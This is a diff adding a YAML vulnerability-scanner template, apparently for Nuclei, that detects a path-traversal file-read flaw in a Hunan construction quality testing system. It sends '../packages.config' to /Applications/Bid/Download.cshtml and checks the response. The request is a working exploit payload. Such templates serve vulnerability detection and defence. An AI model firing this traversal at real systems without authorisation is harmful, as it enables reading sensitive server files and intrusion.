@@ -1,0 +1,27 @@
+id: poc-yaml-hunanjianyan-detection-system-download-fileread
+info:
+  name: 湖南建研工程质量检测系统 /Applications/Bid/Download.cshtml 文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,exploit
+  description: |
+    湖南建研工程质量检测系统存在文件读取漏洞，通过向 /Applications/Bid/Download.cshtml 提交特定参数，可以读取服务器上的文件。
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Applications/Bid/Download.cshtml?file=../packages.config"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<?xml version"
+          - "<package id="
+          - "</packages>"
+        part: body
+      - type: word
+        words:
+          - "application/ms-excel"
+        part: header
